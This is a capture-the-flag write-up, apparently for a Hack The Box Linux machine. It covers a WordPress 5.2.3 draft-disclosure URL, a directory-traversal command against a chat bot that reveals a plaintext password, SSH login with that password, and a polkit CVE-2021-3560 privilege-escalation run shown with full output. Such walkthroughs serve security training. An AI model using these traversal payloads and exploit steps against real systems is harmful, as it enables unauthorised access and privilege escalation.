![image](https://user-images.githubusercontent.com/105310322/197298651-50cce328-5233-48ee-8a65-990f10426f86.png)


### Tools: feroxbuster

### Vulnerabilities: Wordpress, Polkit


Nmap shows 2 of the same webpages open and good 'ol SSH.

```console
└─$ nmap -A -p- -T4 -Pn 10.129.8.182 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-21 12:23 CDT
Nmap scan report for 10.129.8.182
Host is up (0.065s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 1005ea5056a600cb1c9c93df5f83e064 (RSA)
|   256 588c821cc6632a83875c2f2b4f4dc379 (ECDSA)
|_  256 3178afd13bc42e9d604eeb5d03eca022 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.65 seconds
```


![image](https://user-images.githubusercontent.com/105310322/197298762-ddbb84f3-c98d-446d-ad1c-79866651b5f2.png)






I enumerated and fuzzed alot of places but eventually I noticed burp had a request timeout when trying to send a request.

This was done after sending it to the repeater and sending it again.

Note: I had overlooked this the first time since doing before did not give me a request timeout.

```
HTTP/1.1 408 Request Timeout
Date: Fri, 21 Oct 2022 18:54:08 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Content-Length: 221
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>408 Request Timeout</title>
</head><body>
<h1>Request Timeout</h1>
<p>Server timeout waiting for the HTTP request from the client.</p>
</body></html>
```

So if take office.paper and put it in our hosts file we can go to a different subdomain.

![image](https://user-images.githubusercontent.com/105310322/197298809-bb312954-48ca-4a2d-ad4f-dab46100c1a2.png)


Feroxbuster tells us that this webpage is running wordpress, wordpress happens to be vulnerable to alot of exploits so this is good news.

```
└─$ feroxbuster -u http://office.paper -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,git,pdf -q --dont-scan http://office.paper/manual 

200      GET      235l     1209w        0c http://office.paper/
301      GET        1l        0w        0c http://office.paper/index.php => http://office.paper/
403      GET        7l       20w      199c http://office.paper/.html
301      GET        7l       20w      239c http://office.paper/wp-content => http://office.paper/wp-content/
200      GET        0l        0w        0c http://office.paper/wp-content/index.php
301      GET        7l       20w      246c http://office.paper/wp-content/themes => http://office.paper/wp-content/themes/
301      GET        7l       20w      247c http://office.paper/wp-content/uploads => http://office.paper/wp-content/uploads/
200      GET        0l        0w        0c http://office.paper/wp-content/themes/index.php
403      GET        7l       20w      199c http://office.paper/wp-content/.html
301      GET        7l       20w      247c http://office.paper/wp-content/plugins => http://office.paper/wp-content/plugins/
301      GET        7l       20w      240c http://office.paper/wp-includes => http://office.paper/wp-includes/
301      GET        7l       20w      247c http://office.paper/wp-includes/images => http://office.paper/wp-includes/images/
200      GET        0l        0w        0c http://office.paper/wp-includes/category.php
500      GET        0l        0w        0c http://office.paper/wp-includes/media.php
200      GET        0l        0w        0c http://office.paper/wp-includes/feed.php
200      GET       74l      225w        0c http://office.paper/wp-login.php
200      GET        0l        0w        0c http://office.paper/wp-includes/version.php
301      GET        7l       20w      247c http://office.paper/wp-content/upgrade => http://office.paper/wp-content/upgrade/
301      GET        7l       20w      255c http://office.paper/wp-includes/images/smilies => http://office.paper/wp-includes/images/smilies/
200      GET        0l        0w        0c http://office.paper/wp-includes/template.php
301      GET        7l       20w      243c http://office.paper/wp-includes/js => http://office.paper/wp-includes/js/
200      GET        0l        0w        0c http://office.paper/wp-includes/cache.php
200      GET        0l        0w        0c http://office.paper/wp-includes/theme.php
```

If we look through the page code we can see what version the wordpress is. """""""""""""""""""""""""""""""

```
<meta name="generator" content="WordPress 5.2.3" />
```

A google search actually pops up a few vulnerabilites for this version but this is the one we are after. Since this webpage hints at secrets.

https://vulners.com/zdt/1337DAY-ID-33546\

![image](https://user-images.githubusercontent.com/105310322/197298858-4cfda36e-7a26-4c21-86d3-78ac4f8e88a1.png)








Afer inputting ```http://office.paper/?static=1``` as our Url we get back a page that reveals another subdomain!

```http://chat.office.paper/register/8qozr226AhkCHZdyY```


![image](https://user-images.githubusercontent.com/105310322/197298898-1d3c2590-fb3d-46c7-8a48-18df3bf67a68.png)




Navigating to this subdomain allows us to register for something...




After registering we get access to one of the greatest chat rooms of all time :)

Also it shows that we have access to a bot but we can't use the general chat... hmmmm.


![image](https://user-images.githubusercontent.com/105310322/197298996-7b67e16b-b4f7-46a5-97f2-3adadd0a2a8a.png)


After reading the general chat you can see that you can still direct message with the bot. Doing so allows us to read or list files.

![image](https://user-images.githubusercontent.com/105310322/197299325-45e89c8d-fd51-4a06-be3a-d48e02bbc3bc.png)


It turns out this bot was vulnerable to directory traversal and after enumerating most of the files I stumbled on /hubot/.env that was holding a password.

![image](https://user-images.githubusercontent.com/105310322/197299580-83dc196b-12f0-447a-89aa-e68a0f5ccc47.png)


```
recyclops file ../hubot/.env
```

```
 <!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```

If we try and ssh with it we get some luck and login as dwight!


```console
└─$ ssh dwight@paper.htb                     
dwight@paper.htb's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23

[dwight@paper ~]$ cat user.txt
e5c0****************************
```

## Root PE

This part took me awhile and I tried almost everything the latest build of linpeas gave me but polkit CVE-2021-3560 was not one of the CVE's that it detected.

However a couple of things stood out in linpeas such as it running polkit and dbus. Also the CVE is really quick to test out.

Using the secnigma exploit I was able to gain root.

https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

It says to run it a couple of times to get it to work since this exploit is based on timing. Also the password is located in the README.md file of the exploit ```secnigmaftw```


```console
[dwight@paper tmp]$ ./poc.sh 

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper tmp]$ su - secnigma
Password: 
[secnigma@paper ~]$ id
uid=1005(secnigma) gid=1005(secnigma) groups=1005(secnigma),10(wheel)
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma:
```

Just like that we are root

```console
[root@paper secnigma]# id
uid=0(root) gid=0(root) groups=0(root)
[root@paper secnigma]# cat /root/root.txt
2cef****************************
```

I find it strange that linpeas did not catch this exploit unless something was changed in the latest version to not detect this. It would be interesting to see if anyone else had the same issues.

Other than that it was a fun machine!
